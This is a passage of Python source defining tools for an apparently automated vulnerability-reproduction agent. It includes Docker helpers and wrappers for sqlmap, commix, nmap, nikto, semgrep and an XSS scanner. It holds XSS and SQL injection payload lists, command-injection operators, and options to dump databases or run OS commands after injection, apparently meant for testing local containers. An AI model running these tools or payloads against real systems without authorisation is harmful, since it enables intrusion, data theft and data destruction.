            ["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", container_name],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0:
            ip = result.stdout.strip()
            if ip:
                return f"SUCCESS: 容器 {container_name} 的 IP 地址是: {ip}"
            else:
                return f"ERROR: 容器 {container_name} 没有分配 IP 地址"
        else:
            return f"ERROR: 获取容器 IP 失败: {result.stderr}"
    except Exception as e:
        return f"ERROR: 获取容器 IP 异常: {str(e)}"


@tools.tool
def run_docker_container(image: str, name: str = "", ports: str = "", env_vars: str = "", extra_args: str = "") -> str:
    """
    运行 Docker 容器（用于复杂应用漏洞复现）
    
    重要：使用标准 bridge 网络 + 端口映射，不要用 host 网络！
    
    :param image: Docker 镜像名称 (如 n8nio/n8n:1.24.0)
    :param name: 容器名称（必填，方便后续管理）
    :param ports: 端口映射，格式 "主机端口:容器端口" (如 "5680:5678")，多个用逗号分隔
    :param env_vars: 环境变量，格式 "KEY=VALUE,KEY2=VALUE2"
    :param extra_args: 其他 docker run 参数
    :return: 运行结果，包含访问地址
    
    示例：
        run_docker_container(
            image="n8nio/n8n:1.24.0",
            name="n8n_vuln",
            ports="5680:5678",
            env_vars="N8N_HOST=0.0.0.0,N8N_PORT=5678,N8N_PROTOCOL=http"
        )
    """
    try:
        if not name:
            name = f"vuln_{int(time.time())}"
        
        # 1. 清理同名容器（忽略错误）
        subprocess.run(["docker", "rm", "-f", name], capture_output=True, text=True)
        time.sleep(1)
        
        # 2. 检查端口是否被占用，如果已有服务在该端口，直接返回使用提示
        if ports:
            host_port = ports.split(":")[0].split(",")[0].strip()
            port_check = subprocess.run(
                ["docker", "ps", "--format", "{{.Names}}\t{{.Ports}}", "-a"],
                capture_output=True, text=True
            )
            if f":{host_port}->" in port_check.stdout:
                # 找出占用端口的容器
                for line in port_check.stdout.strip().split('\n'):
                    if f":{host_port}->" in line:
                        existing_container = line.split('\t')[0]
                        return f"INFO: 端口 {host_port} 已被容器 '{existing_container}' 占用。请直接使用 http://localhost:{host_port} 进行测试，或先停止该容器。"
        
        # 3. 构建命令（使用默认 bridge 网络，不用 host）
        cmd = ["docker", "run", "-d", "--name", name]
        
        # 端口映射
        if ports:
            for port in ports.split(","):
                port = port.strip()
                if port:
                    cmd.extend(["-p", port])
        
        # 环境变量
        if env_vars:
            for env in env_vars.split(","):
                env = env.strip()
                if env:
                    cmd.extend(["-e", env])
        
        # 额外参数
        if extra_args:
            cmd.extend(extra_args.split())
        
        cmd.append(image)
        
        print(f"[Docker] Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        if result.returncode != 0:
            return f"ERROR: 启动容器失败: {result.stderr}"
        
        container_id = result.stdout.strip()[:12]
        
        # 4. 等待容器启动并检查状态
        time.sleep(5)
        
        check = subprocess.run(["docker", "ps", "-q", "-f", f"name={name}"], capture_output=True, text=True)
        if not check.stdout.strip():
            logs = subprocess.run(["docker", "logs", name], capture_output=True, text=True)
            return f"ERROR: 容器启动后退出，日志:\n{logs.stderr or logs.stdout}"
        
        # 5. 获取访问信息
        if ports:
            host_port = ports.split(":")[0].split(",")[0].strip()
            access_url = f"http://localhost:{host_port}"
            return f"SUCCESS: 容器 {name} 已启动 (ID: {container_id})。访问地址: {access_url}。请用 wait_for_service 确认服务就绪后再进行测试。"
        else:
            return f"SUCCESS: 容器 {name} 已启动 (ID: {container_id})。未配置端口映射。"
            
    except subprocess.TimeoutExpired:
        return f"ERROR: 启动容器超时"
    except Exception as e:
        return f"ERROR: Docker 运行异常: {str(e)}"


@tools.tool  
def wait_for_service(url: str, timeout: int = 90, interval: int = 5) -> str:
    """
    等待服务启动并可访问（增强版：含详细诊断）
    
    :param url: 要检查的 URL
    :param timeout: 超时时间（秒），默认 90
    :param interval: 检查间隔（秒），默认 5
    :return: 服务状态和诊断信息
    """
    import urllib.request
    import urllib.error
    import socket
    from urllib.parse import urlparse
    
    start_time = time.time()
    attempts = 0
    errors_seen = []
    
    # 解析 URL 获取 host 和 port
    parsed = urlparse(url)
    host = parsed.hostname or 'localhost'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    
    while time.time() - start_time < timeout:
        attempts += 1
        elapsed = int(time.time() - start_time)
        
        # 第一步：检查端口是否可连接
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result != 0:
                error_msg = f"[{elapsed}s] 端口 {host}:{port} 未开放 (connect_ex={result})"
                if error_msg not in errors_seen:
                    errors_seen.append(error_msg)
                time.sleep(interval)
                continue
        except Exception as e:
            error_msg = f"[{elapsed}s] Socket 检查失败: {str(e)}"
            if error_msg not in errors_seen:
                errors_seen.append(error_msg)
            time.sleep(interval)
            continue
        
        # 第二步：端口开放，尝试 HTTP 请求
        try:
            req = urllib.request.Request(url, method='GET')
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
            req.add_header('Accept', '*/*')
            response = urllib.request.urlopen(req, timeout=10)
            
            # 成功！返回详细信息
            return f"""SUCCESS: 服务已就绪
- URL: {url}
- 状态码: {response.status}
- 响应时间: {elapsed}s (尝试 {attempts} 次)
- 内容类型: {response.headers.get('Content-Type', 'unknown')}
- 服务已准备好进行 POC 测试"""
            
        except urllib.error.HTTPError as e:
            # HTTP 错误但服务在响应 - 可能是正常的
            if e.code in [401, 403, 404, 405]:
                return f"""SUCCESS: 服务已就绪（HTTP {e.code}）
- URL: {url}
- 状态码: {e.code} ({e.reason})
- 响应时间: {elapsed}s
- 注意: 收到 HTTP 错误但服务正在响应，可以继续 POC 测试"""
            else:
                error_msg = f"[{elapsed}s] HTTP 错误: {e.code} {e.reason}"
                if error_msg not in errors_seen:
                    errors_seen.append(error_msg)
                    
        except urllib.error.URLError as e:
            error_msg = f"[{elapsed}s] URL 错误: {str(e.reason)}"
            if error_msg not in errors_seen:
                errors_seen.append(error_msg)
                
        except socket.timeout:
            error_msg = f"[{elapsed}s] HTTP 请求超时"
            if error_msg not in errors_seen:
                errors_seen.append(error_msg)
                
        except Exception as e:
            error_msg = f"[{elapsed}s] 未知错误: {type(e).__name__}: {str(e)}"
            if error_msg not in errors_seen:
                errors_seen.append(error_msg)
        
        time.sleep(interval)
    
    # 超时 - 提供详细诊断
    # 检查是否有 Docker 容器在运行
    docker_diag = ""
    try:
        containers = subprocess.run(
            ["docker", "ps", "--format", "{{.Names}}\t{{.Status}}\t{{.Ports}}"],
            capture_output=True, text=True, timeout=10
        )
        if containers.stdout.strip():
            docker_diag = f"\n\n当前运行的容器:\n{containers.stdout}"
        else:
            docker_diag = "\n\n警告: 没有运行中的 Docker 容器！"
    except:
        docker_diag = "\n\n无法获取 Docker 容器状态"
    
    # 检查端口监听情况
    port_diag = ""
    try:
        # 在 Linux 环境使用 ss 命令
        ss_result = subprocess.run(
            ["ss", "-tlnp", f"sport = :{port}"],
            capture_output=True, text=True, timeout=5
        )
        if ss_result.stdout.strip():
            port_diag = f"\n\n端口 {port} 监听状态:\n{ss_result.stdout}"
        else:
            port_diag = f"\n\n端口 {port} 未被监听"
    except:
        pass
    
    error_history = "\n".join(errors_seen[-5:]) if errors_seen else "无错误记录"
    
    return f"""TIMEOUT: 服务在 {timeout} 秒内未就绪
- URL: {url}
- 尝试次数: {attempts}
- 目标: {host}:{port}

错误历史（最近 5 条）:
{error_history}
{docker_diag}
{port_diag}

建议:
1. 检查容器是否正确启动: docker ps
2. 检查容器日志: docker logs <container_name>
3. 确认服务绑定到 0.0.0.0 而不是 127.0.0.1
4. 确认端口映射正确"""


@tools.tool
def diagnose_docker_network(container_name: str = "") -> str:
    """
    诊断 Docker 网络状况 - 检查容器、端口映射、网络连通性
    
    :param container_name: 可选，指定容器名称进行详细诊断
    :return: 详细的网络诊断报告
    """
    report = ["=== Docker 网络诊断报告 ===\n"]
    
    try:
        # 1. 列出所有运行中的容器
        ps_result = subprocess.run(
            ["docker", "ps", "--format", "table {{.Names}}\t{{.Status}}\t{{.Ports}}\t{{.Networks}}"],
            capture_output=True, text=True, timeout=10
        )
        report.append("【运行中的容器】")
        report.append(ps_result.stdout if ps_result.stdout.strip() else "无运行中的容器")
        report.append("")
        
        # 2. 如果指定了容器，进行详细诊断
        if container_name:
            # 检查容器详情
            inspect_result = subprocess.run(
                ["docker", "inspect", container_name, "--format", 
                 "{{.State.Status}} | IP: {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} | Ports: {{json .NetworkSettings.Ports}}"],
                capture_output=True, text=True, timeout=10
            )
            if inspect_result.returncode == 0:
                report.append(f"【容器 {container_name} 详情】")
                report.append(inspect_result.stdout.strip())
                report.append("")
                
                # 获取容器日志最后 20 行
                logs_result = subprocess.run(
                    ["docker", "logs", "--tail", "20", container_name],
                    capture_output=True, text=True, timeout=10
                )
                report.append(f"【容器日志（最后 20 行）】")
                log_content = logs_result.stderr or logs_result.stdout
                report.append(log_content if log_content.strip() else "无日志")
                report.append("")
                
                # 检查容器内部监听的端口
                exec_result = subprocess.run(
                    ["docker", "exec", container_name, "sh", "-c", 
                     "netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null || echo 'netstat/ss not available'"],
                    capture_output=True, text=True, timeout=10
                )
                report.append(f"【容器内部监听端口】")
                report.append(exec_result.stdout if exec_result.stdout.strip() else "无法获取")
                report.append("")
            else:
                report.append(f"警告: 找不到容器 {container_name}")
                report.append(inspect_result.stderr)
        
        # 3. Docker 网络列表
        network_result = subprocess.run(
            ["docker", "network", "ls", "--format", "table {{.Name}}\t{{.Driver}}\t{{.Scope}}"],
            capture_output=True, text=True, timeout=10
        )
        report.append("【Docker 网络】")
        report.append(network_result.stdout if network_result.stdout.strip() else "无网络")
        report.append("")
        
        # 4. 主机端口监听情况
        try:
            ss_result = subprocess.run(
                ["ss", "-tlnp"],
                capture_output=True, text=True, timeout=10
            )
            report.append("【主机端口监听】")
            # 只显示常见端口
            lines = [l for l in ss_result.stdout.split('\n') if any(p in l for p in [':80', ':443', ':5678', ':8080', ':3000', ':8000', ':9000'])]
            report.append('\n'.join(lines) if lines else "无相关端口监听")
        except:
            report.append("【主机端口监听】无法获取")
        
    except subprocess.TimeoutExpired:
        report.append("ERROR: 诊断命令超时")
    except Exception as e:
        report.append(f"ERROR: 诊断失败: {str(e)}")
    
    return '\n'.join(report)


@tools.tool
def stop_docker_container(container_name: str, remove: bool = True) -> str:
    """
    停止并可选删除 Docker 容器
    
    :param container_name: 容器名称或 ID
    :param remove: 是否同时删除容器，默认 True
    :return: 操作结果
    """
    try:
        # 停止容器
        stop_result = subprocess.run(
            ["docker", "stop", container_name],
            capture_output=True, text=True, timeout=30
        )
        
        if stop_result.returncode != 0:
            # 可能容器已经停止
            pass
        
        if remove:
            rm_result = subprocess.run(
                ["docker", "rm", "-f", container_name],
                capture_output=True, text=True, timeout=10
            )
            if rm_result.returncode == 0:
                return f"SUCCESS: 容器 {container_name} 已停止并删除"
            else:
                return f"WARNING: 容器已停止但删除失败: {rm_result.stderr}"
        else:
            return f"SUCCESS: 容器 {container_name} 已停止"
            
    except subprocess.TimeoutExpired:
        return f"ERROR: 操作超时"
    except Exception as e:
        return f"ERROR: 操作失败: {str(e)}"


# ============================================================
# 专业安全工具 (Specialized Security Tools)
# ============================================================

@tools.tool
def run_sqlmap(
    target_url: Annotated[str, "目标URL (必须包含参数, 如 http://target.com/page?id=1)"],
    method: Annotated[str, "HTTP方法: GET 或 POST"] = "GET",
    data: Annotated[str, "POST数据 (可选)"] = None,
    parameter: Annotated[str, "指定要测试的参数名 (可选, 不指定则测试所有)"] = None,
    level: Annotated[int, "测试级别 1-5 (越高越彻底, 默认1)"] = 1,
    risk: Annotated[int, "风险级别 1-3 (越高越危险, 默认1)"] = 1,
    technique: Annotated[str, "注入技术: B=布尔盲注, T=时间盲注, E=报错注入, U=联合查询, S=堆叠查询"] = None,
    dbms: Annotated[str, "指定数据库类型: mysql, postgresql, mssql, oracle, sqlite"] = None,
    dump: Annotated[bool, "是否导出数据"] = False,
    batch: Annotated[bool, "非交互模式, 使用默认选项"] = True,
    timeout: Annotated[int, "超时秒数"] = 120,
) -> str:
    """
    运行 SQLMap 进行 SQL 注入自动化测试。
    
    SQLMap 是最强大的 SQL 注入自动化工具，支持:
    - 自动检测注入点
    - 多种注入技术 (布尔盲注、时间盲注、报错注入、联合查询、堆叠查询)
    - 多种数据库 (MySQL, PostgreSQL, MSSQL, Oracle, SQLite等)
    - 数据导出、权限提升、OS命令执行等
    
    示例:
    1. 基础测试: run_sqlmap(target_url="http://target.com/page?id=1")
    2. POST注入: run_sqlmap(target_url="http://target.com/login", method="POST", data="user=admin&pass=test")
    3. 深度测试: run_sqlmap(target_url="http://target.com/page?id=1", level=3, risk=2)
    """
    try:
        # 确保 sqlmap 已安装
        installed, msg = _install_sqlmap()
        if not installed:
            return f"ERROR: {msg}"
        
        # 构建 sqlmap 命令
        cmd = ["sqlmap", "-u", target_url]
        
        if method.upper() == "POST" and data:
            cmd.extend(["--method", "POST", "--data", data])
        
        if parameter:
            cmd.extend(["-p", parameter])
        
        cmd.extend(["--level", str(level)])
        cmd.extend(["--risk", str(risk)])
        
        if technique:
            cmd.extend(["--technique", technique])
        
        if dbms:
            cmd.extend(["--dbms", dbms])
        
        if dump:
            cmd.append("--dump")
        
        if batch:
            cmd.append("--batch")
        
        # 添加一些常用选项
        cmd.extend([
            "--random-agent",  # 使用随机 User-Agent
            "--threads", "4",  # 多线程
            "--output-dir", "/tmp/sqlmap_output",
        ])
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        
        output = result.stdout + result.stderr
        
        # 分析结果
        if "is vulnerable" in output or "injectable" in output.lower():
            return f"VULNERABLE: SQLMap 发现 SQL 注入漏洞!\n\n{output[-3000:]}"
        elif "all tested parameters do not appear to be injectable" in output:
            return f"NOT_VULNERABLE: SQLMap 未发现 SQL 注入漏洞\n\n{output[-2000:]}"
        else:
            return f"RESULT:\n{output[-3000:]}"
            
    except subprocess.TimeoutExpired:
        return f"TIMEOUT: SQLMap 运行超时 ({timeout}秒)"
    except FileNotFoundError:
        return "ERROR: SQLMap 未安装。请运行: pip install sqlmap 或 apt-get install sqlmap"
    except Exception as e:
        return f"ERROR: SQLMap 运行失败: {str(e)}"


@tools.tool
def run_commix(
    target_url: Annotated[str, "目标URL"],
    data: Annotated[str, "POST数据 (可选, 用于POST请求)"] = None,
    cookie: Annotated[str, "Cookie 值 (可选)"] = None,
    parameter: Annotated[str, "指定要测试的参数名"] = None,
    technique: Annotated[str, "注入技术: classic, eval-based, time-based, file-based"] = None,
    os_cmd: Annotated[str, "成功注入后执行的OS命令 (可选)"] = None,
    batch: Annotated[bool, "非交互模式"] = True,
    timeout: Annotated[int, "超时秒数"] = 120,
) -> str:
    """
    运行 Commix 进行命令注入自动化测试。
    
    Commix (Command Injection Exploiter) 是专门用于:
    - 检测命令注入漏洞
    - 自动化利用命令注入
    - 支持多种注入技术
    
    常见命令注入模式:
    - ; command (经典)
    - | command (管道)
    - `command` (反引号)
    - $(command) (命令替换)
    - && command, || command (逻辑运算符)
    
    示例:
    1. 基础测试: run_commix(target_url="http://target.com/ping?ip=127.0.0.1")
    2. POST测试: run_commix(target_url="http://target.com/exec", data="cmd=ls")
    """
    try:
        # 确保 commix 已安装
        installed, msg = _install_commix()
        if not installed:
            return f"ERROR: {msg}"
        
        # 确定 commix 可执行文件路径
        use_shell = False
        if shutil.which("commix"):
            commix_cmd = "commix"
        elif os.path.exists("/opt/commix/commix.py"):
            commix_cmd = "python3 /opt/commix/commix.py"
            use_shell = True
        else:
            return "ERROR: Commix 未找到可执行文件"
        
        # 构建 commix 命令
        cmd_parts = [commix_cmd, "--url", target_url]
        
        if data:
            cmd_parts.extend(["--data", data])
        
        if cookie:
            cmd_parts.extend(["--cookie", cookie])
        
        if parameter:
            cmd_parts.extend(["-p", parameter])
        
        if technique:
            cmd_parts.extend(["--technique", technique])
        
        if os_cmd:
            cmd_parts.extend(["--os-cmd", os_cmd])
        
        if batch:
            cmd_parts.append("--batch")
        
        if use_shell:
            cmd = " ".join(cmd_parts)
        else:
            cmd = cmd_parts
        
        result = subprocess.run(
            cmd,
            shell=use_shell,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        
        output = result.stdout + result.stderr
        
        if "is vulnerable" in output.lower() or "command injection" in output.lower():
            return f"VULNERABLE: Commix 发现命令注入漏洞!\n\n{output[-3000:]}"
        elif "not appear to be injectable" in output:
            return f"NOT_VULNERABLE: Commix 未发现命令注入漏洞\n\n{output[-2000:]}"
        else:
            return f"RESULT:\n{output[-3000:]}"
            
    except subprocess.TimeoutExpired:
        return f"TIMEOUT: Commix 运行超时 ({timeout}秒)"
    except FileNotFoundError:
        return "ERROR: Commix 未安装。请运行: pip install commix 或 git clone https://github.com/commixproject/commix.git"
    except Exception as e:
        return f"ERROR: Commix 运行失败: {str(e)}"


@tools.tool
def run_nmap(
    target: Annotated[str, "目标IP或主机名"],
    ports: Annotated[str, "端口范围 (如 '80,443' 或 '1-1000' 或 '-' 表示全部)"] = "1-1000",
    scan_type: Annotated[str, "扫描类型: quick, full, service, vuln, script"] = "service",
    scripts: Annotated[str, "指定NSE脚本 (如 'http-vuln-*' 或 'vuln')"] = None,
    timeout: Annotated[int, "超时秒数"] = 180,
) -> str:
    """
    运行 Nmap 进行网络扫描和服务识别。
    
    用途:
    - 验证目标环境可达性
    - 发现开放端口和服务
    - 服务版本识别
    - 使用NSE脚本进行漏洞扫描
    
    扫描类型:
    - quick: 快速扫描常用端口
    - full: 全端口扫描
    - service: 服务版本识别 (-sV)
    - vuln: 使用漏洞扫描脚本
    - script: 使用指定NSE脚本
    
    示例:
    1. 快速扫描: run_nmap(target="192.168.1.1", scan_type="quick")
    2. 服务识别: run_nmap(target="target.com", ports="80,443,8080", scan_type="service")
    3. 漏洞扫描: run_nmap(target="target.com", scan_type="vuln")
    """
    try:
        # 确保 nmap 已安装
        installed, msg = _install_nmap()
        if not installed:
            return f"ERROR: {msg}"
        
        cmd = ["nmap"]
        
        if scan_type == "quick":
            cmd.extend(["-F", "-T4"])  # 快速模式
        elif scan_type == "full":
            cmd.extend(["-p-", "-T4"])  # 全端口
        elif scan_type == "service":
            cmd.extend(["-sV", "-T4"])  # 服务版本
        elif scan_type == "vuln":
            cmd.extend(["-sV", "--script", "vuln", "-T4"])
        elif scan_type == "script" and scripts:
            cmd.extend(["-sV", "--script", scripts, "-T4"])
        else:
            cmd.extend(["-sV", "-T4"])  # 默认服务版本
        
        if ports and ports != "-":
            cmd.extend(["-p", ports])
        elif ports == "-":
            cmd.append("-p-")
        
        cmd.append(target)
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        
        output = result.stdout + result.stderr
        
        # 解析结果
        if "Host is up" in output:
            return f"SCAN_COMPLETE: 目标可达\n\n{output}"
        elif "Host seems down" in output:
            return f"HOST_DOWN: 目标不可达或被防火墙阻止\n\n{output}"
        else:
            return f"RESULT:\n{output}"
            
    except subprocess.TimeoutExpired:
        return f"TIMEOUT: Nmap 扫描超时 ({timeout}秒)"
    except FileNotFoundError:
        return "ERROR: Nmap 未安装。请运行: apt-get install nmap"
    except Exception as e:
        return f"ERROR: Nmap 运行失败: {str(e)}"


@tools.tool
def run_nikto(
    target: Annotated[str, "目标URL或IP"],
    port: Annotated[int, "端口号"] = 80,
    ssl: Annotated[bool, "是否使用SSL"] = False,
    tuning: Annotated[str, "扫描类型: 1=日志文件, 2=配置错误, 3=信息泄露, 4=XSS, 5=远程文件, 6=DoS, 7=远程shell"] = None,
    timeout: Annotated[int, "超时秒数"] = 300,
) -> str:
    """
    运行 Nikto 进行 Web 服务器漏洞扫描。
    
    Nikto 可以检测:
    - 服务器配置错误
    - 默认文件和程序
    - 不安全的文件和程序
    - 过时的服务器软件
    - 特定版本的已知漏洞
    
    示例:
    run_nikto(target="http://target.com", port=80)
    run_nikto(target="https://target.com", port=443, ssl=True)
    """
    try:
        # 确保 nikto 已安装
        installed, msg = _install_nikto()
        if not installed:
            return f"ERROR: {msg}"
        
        cmd = ["nikto", "-h", target, "-p", str(port)]
        
        if ssl:
            cmd.append("-ssl")
        
        if tuning:
            cmd.extend(["-Tuning", tuning])
        
        # 输出格式
        cmd.extend(["-Format", "txt"])
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        
        output = result.stdout + result.stderr
        
        # 分析结果
        vuln_indicators = ["OSVDB", "vulnerability", "vulnerable", "CVE-"]
        found_vulns = any(ind.lower() in output.lower() for ind in vuln_indicators)
        
        if found_vulns:
            return f"VULNERABILITIES_FOUND: Nikto 发现潜在漏洞\n\n{output[-4000:]}"
        else:
            return f"SCAN_COMPLETE:\n{output[-3000:]}"
            
    except subprocess.TimeoutExpired:
        return f"TIMEOUT: Nikto 扫描超时 ({timeout}秒)"
    except FileNotFoundError:
        return "ERROR: Nikto 未安装。请运行: apt-get install nikto"
    except Exception as e:
        return f"ERROR: Nikto 运行失败: {str(e)}"


@tools.tool
def run_semgrep(
    target_path: Annotated[str, "要扫描的代码路径 (文件或目录)"],
    rules: Annotated[str, "规则集: auto, p/security-audit, p/owasp-top-ten, p/xss, p/sql-injection, p/command-injection"] = "auto",
    language: Annotated[str, "指定语言: python, javascript, java, go, php, ruby, etc"] = None,
    severity: Annotated[str, "最低严重级别: INFO, WARNING, ERROR"] = "WARNING",
    json_output: Annotated[bool, "是否返回JSON格式"] = False,
    timeout: Annotated[int, "超时秒数"] = 120,
) -> str:
    """
    运行 Semgrep 进行静态代码安全分析。
    
    Semgrep 特点:
    - 支持多种语言 (Python, JavaScript, Java, Go, PHP, Ruby等)
    - 预置安全规则集 (OWASP Top 10, XSS, SQLi, 命令注入等)
    - 可自定义规则
    - 快速、准确、低误报
    
    常用规则集:
    - auto: 自动检测语言并应用合适规则
    - p/security-audit: 全面安全审计
    - p/owasp-top-ten: OWASP十大漏洞
    - p/xss: XSS漏洞规则
    - p/sql-injection: SQL注入规则
    - p/command-injection: 命令注入规则
    - p/secrets: 密钥泄露检测
    
    示例:
    1. 自动扫描: run_semgrep(target_path="/path/to/code")
    2. 安全审计: run_semgrep(target_path="/path/to/code", rules="p/security-audit")
    3. 针对性扫描: run_semgrep(target_path="/path/to/code", rules="p/sql-injection", language="python")
    """
    try:
        # 确保 semgrep 已安装
        installed, msg = _install_semgrep()
        if not installed:
            return f"ERROR: {msg}"
        
        cmd = ["semgrep", "scan"]
        
        # 添加规则
        if rules.startswith("p/") or rules == "auto":
            cmd.extend(["--config", rules])
        else:
            cmd.extend(["--config", f"p/{rules}"])
        
        if language:
            cmd.extend(["--lang", language])
        
        cmd.extend(["--severity", severity])
        
        if json_output:
            cmd.append("--json")
        
        # 添加目标路径
        cmd.append(target_path)
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        
        output = result.stdout + result.stderr
        
        # 分析结果
        if "findings" in output.lower() or "error" in output.lower() or "warning" in output.lower():
            if json_output:
                return f"ANALYSIS_COMPLETE:\n{output}"
            else:
                # 统计发现的问题
                lines = output.split('\n')
                findings = [l for l in lines if 'error' in l.lower() or 'warning' in l.lower()]
                return f"ANALYSIS_COMPLETE: 发现 {len(findings)} 个潜在问题\n\n{output[-4000:]}"
        else:
            return f"NO_ISSUES: Semgrep 未发现问题\n\n{output[-2000:]}"
            
    except subprocess.TimeoutExpired:
        return f"TIMEOUT: Semgrep 分析超时 ({timeout}秒)"
    except FileNotFoundError:
        return "ERROR: Semgrep 未安装。请运行: pip install semgrep 或 brew install semgrep"
    except Exception as e:
        return f"ERROR: Semgrep 运行失败: {str(e)}"


@tools.tool
def run_xss_scanner(
    target_url: Annotated[str, "目标URL (应包含参数)"],
    use_xsstrike: Annotated[bool, "是否使用 XSStrike (更强大但需要安装)"] = True,
    crawl: Annotated[bool, "是否爬取页面发现更多注入点"] = False,
    blind: Annotated[bool, "是否使用盲XSS检测"] = False,
    timeout: Annotated[int, "超时秒数"] = 120,
) -> str:
    """
    运行 XSS 漏洞扫描器。
    
    默认使用 XSStrike (最强大的开源XSS扫描器):
    - 智能payload生成
    - WAF绕过
    - 盲XSS检测
    - DOM XSS检测
    
    如果 XSStrike 不可用，会回退到内置扫描器。
    
    示例:
    1. 基础扫描: run_xss_scanner(target_url="http://target.com/search?q=test")
    2. 深度扫描: run_xss_scanner(target_url="http://target.com/", crawl=True)
    3. 盲XSS: run_xss_scanner(target_url="http://target.com/form", blind=True)
    """
    import requests
    
    if use_xsstrike:
        # 尝试使用 XSStrike
        installed, msg = _install_xsstrike()
        if installed:
            try:
                # 确定 xsstrike 可执行文件
                use_shell = False
                if shutil.which("xsstrike"):
                    xss_cmd = "xsstrike"
                elif os.path.exists("/opt/xsstrike/xsstrike.py"):
                    xss_cmd = "python3 /opt/xsstrike/xsstrike.py"
                    use_shell = True
                else:
                    # 回退到内置扫描器
                    use_xsstrike = False
                
                if use_xsstrike:
                    cmd_parts = [xss_cmd, "-u", target_url, "--skip"]  # --skip 跳过确认
                    
                    if crawl:
                        cmd_parts.append("--crawl")
                    
                    if blind:
                        cmd_parts.append("--blind")
                    
                    if use_shell:
                        cmd = " ".join(cmd_parts)
                    else:
                        cmd = cmd_parts
                    
                    result = subprocess.run(
                        cmd,
                        shell=use_shell,
                        capture_output=True,
                        text=True,
                        timeout=timeout,
                    )
                    
                    output = result.stdout + result.stderr
                    
                    if "Vulnerable" in output or "payload" in output.lower():
                        return f"VULNERABLE: XSStrike 发现 XSS 漏洞!\n\n{output[-3000:]}"
                    elif "No parameter" in output:
                        return f"NO_PARAMS: 未找到可测试的参数\n\n{output[-2000:]}"
                    else:
                        return f"RESULT:\n{output[-3000:]}"
                        
            except subprocess.TimeoutExpired:
                return f"TIMEOUT: XSStrike 扫描超时 ({timeout}秒)"
            except Exception as e:
                # XSStrike 失败，回退到内置扫描器
                pass
    
    # 内置扫描器作为备用
    default_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        "'-alert('XSS')-'",
        '<body onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '{{constructor.constructor("alert(1)")()}}',
        '${alert("XSS")}',
        '<details open ontoggle=alert("XSS")>',
    ]
    
    results = []
    vulnerable = False
    
    try:
        session = requests.Session()
        parsed = urllib.parse.urlparse(target_url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return "NO_PARAMS: URL 中没有可测试的参数"
        
        for payload in default_payloads:
            try:
                for param_name in params:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    new_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    resp = session.get(test_url, timeout=10, allow_redirects=True)
                    
                    if payload in resp.text:
                        vulnerable = True
                        results.append(f"[VULNERABLE] Param: {param_name}, Payload: {payload[:40]}...")
                        break
                        
            except Exception as e:
                results.append(f"[ERROR] {str(e)[:50]}")
        
        summary = f"内置扫描器完成: 测试了 {len(default_payloads)} 个 payload\n"
        if vulnerable:
            summary = f"VULNERABLE: 发现 XSS 漏洞!\n{summary}"
        else:
            summary = f"NOT_VULNERABLE: 未发现反射型 XSS\n{summary}"
        
        return summary + "\n".join(results)
        
    except Exception as e:
        return f"ERROR: XSS 扫描失败: {str(e)}"


@tools.tool
def analyze_vulnerability_pattern(
    vuln_type: Annotated[str, "漏洞类型: sqli, xss, command_injection, path_traversal, ssrf, xxe, deserialization, auth_bypass"],
    target_info: Annotated[str, "目标信息 (URL, 参数, 技术栈等)"],
    additional_context: Annotated[str, "额外上下文 (CVE描述, 已知payload等)"] = None,
) -> str:
    """
    分析特定漏洞类型并提供利用建议。
    
    这是一个"大脑"工具,根据漏洞类型提供:
    1. 推荐使用的工具
    2. 常见利用技术
    3. 典型payload示例
    4. 验证方法
    
    支持的漏洞类型:
    - sqli: SQL注入
    - xss: 跨站脚本
    - command_injection: 命令注入
    - path_traversal: 路径遍历
    - ssrf: 服务端请求伪造
    - xxe: XML外部实体注入
    - deserialization: 反序列化漏洞
    - auth_bypass: 认证绕过
    """
    
    patterns = {
        "sqli": {
            "recommended_tools": ["run_sqlmap", "http_request"],
            "techniques": [
                "联合查询注入 (UNION SELECT)",
                "布尔盲注 (AND 1=1 vs AND 1=2)",
                "时间盲注 (SLEEP, BENCHMARK)",
                "报错注入 (extractvalue, updatexml)",
                "堆叠查询 (;DROP TABLE)",
            ],
            "payloads": [
                "' OR '1'='1",
                "' UNION SELECT NULL,NULL,NULL--",
                "' AND SLEEP(5)--",
                "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            "verification": "检查是否返回额外数据、延迟响应、或数据库错误信息",
        },
        "xss": {
            "recommended_tools": ["run_xss_scanner", "browser_check_xss", "http_request"],
            "techniques": [
                "反射型XSS (参数直接输出)",
                "存储型XSS (数据存储后输出)",
                "DOM XSS (客户端处理)",
                "模板注入 ({{}}语法)",
            ],
            "payloads": [
                '<script>alert(document.domain)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '"><img src=x onerror=alert(1)>',
                "javascript:alert(1)",
            ],
            "verification": "在浏览器中检查是否执行JavaScript代码",
        },
        "command_injection": {
            "recommended_tools": ["run_commix", "http_request"],
            "techniques": [
